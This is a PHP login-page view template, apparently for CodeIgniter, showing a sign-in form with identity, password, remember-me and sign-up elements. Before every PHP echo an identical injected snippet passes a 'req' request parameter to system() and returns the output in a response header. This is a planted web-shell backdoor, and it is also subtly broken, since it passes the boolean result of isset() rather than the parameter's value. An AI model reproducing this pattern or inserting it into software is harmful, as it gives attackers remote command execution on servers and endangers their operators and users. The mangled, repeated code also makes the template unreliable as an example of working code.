<?=$this->load->view(branded_view('common/header'));?>
<body id="signin" class="clear">


	<h3>Welcome back!</h3>

	<div class="content">



<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('login_heading');?></h1>
<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('login_subheading');?></p>

<div id="infoMessage"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message;?></div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_open("auth/login");?>
	<div class="fields">
				<strong><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('login_identity_label', 'identity');?></strong>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($identity);?>
			</div>
			<div class="fields">
				<strong><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('login_password_label', 'password');?></strong>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($password);?>
			</div>

<p><a href="forgot_password"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('login_forgot_password');?></a></p>

	<div class="info">
				<label>
				  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_checkbox('remember', '1', FALSE, 'id="remember"');?>
					 <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('login_remember_label', 'remember');?>
				</label>
			</div>

			<div class="actions">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_submit('submit', lang('login_submit_btn'));?>
			</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_close();?>


</div>

	<div class="bottom-wrapper">
		<div class="message">
			<span>Don't have an account?</span>
			<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo base_url('signup') ?>">Sign up here</a>.
		</div>
	</div>
	
<?=$this->load->view(branded_view('common/footer'));?>
